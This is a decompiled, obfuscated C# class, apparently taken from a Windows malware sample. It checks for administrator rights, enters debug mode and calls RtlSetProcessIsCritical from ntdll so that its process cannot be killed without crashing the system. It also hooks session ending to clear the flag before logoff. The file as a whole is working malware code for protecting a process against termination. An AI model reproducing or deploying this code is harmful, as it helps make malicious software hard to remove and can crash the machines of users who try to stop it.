using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace AFBGXefvzhgrS;

public static class PQtaWlHhgdOm
{
	public static bool noYcNwLDngkWV()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void SoQIMBhjHxqH(object sender, SessionEndingEventArgs e)
	{
		if (noYcNwLDngkWV())
		{
			qCJSmgyuaFBF();
		}
	}

	public static void jJRFFknKplWC()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		try
		{
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(SoQIMBhjHxqH));
			Process.EnterDebugMode();
			RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	public static void qCJSmgyuaFBF()
	{
		try
		{
			RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint uint_0, uint uint_1, uint uint_2);
}
